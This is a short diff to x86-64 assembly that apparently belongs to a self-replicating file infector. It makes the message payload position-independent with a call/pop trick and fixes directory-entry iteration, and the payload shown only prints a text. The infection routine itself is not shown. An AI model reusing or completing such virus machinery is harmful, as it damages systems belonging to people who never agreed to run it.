@@ -80,7 +80,7 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
       ;; EXEC PAYLOAD (PRINT STDOUT) >--------------------------------------<
 
-      jmp .Payload
+      call .Payload
     
       .msg:    ; idk why I made it a byte array...
     	  db	0x47, 0x65, 0x6e, 0x65, 0x73, 0x69, 0x73, 0x20, 0x31, 0x3a, 
@@ -97,7 +97,8 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
         msglen equ $-.msg
 
       .Payload:
-      Write STDOUT, .msg, msglen
+      pop   rsi
+      Write STDOUT, rsi, msglen
 
       Close rbx
 
@@ -107,8 +108,8 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
       Close rbx
 
     .NextIteration:
-      add   r9w, word [rsp + linux_dirent64.d_reclen]  ; len
-      cmp   r9w, word [rsp + SZ_DENT]                  ; bytes_read
+      add   r9w, word [rsp + r9 + linux_dirent64.d_reclen]  ; len
+      cmp   r9w, word [rsp + SZ_DENT]                       ; bytes_read
       jl    .EnumFiles
 
     jmp   .EnumDir
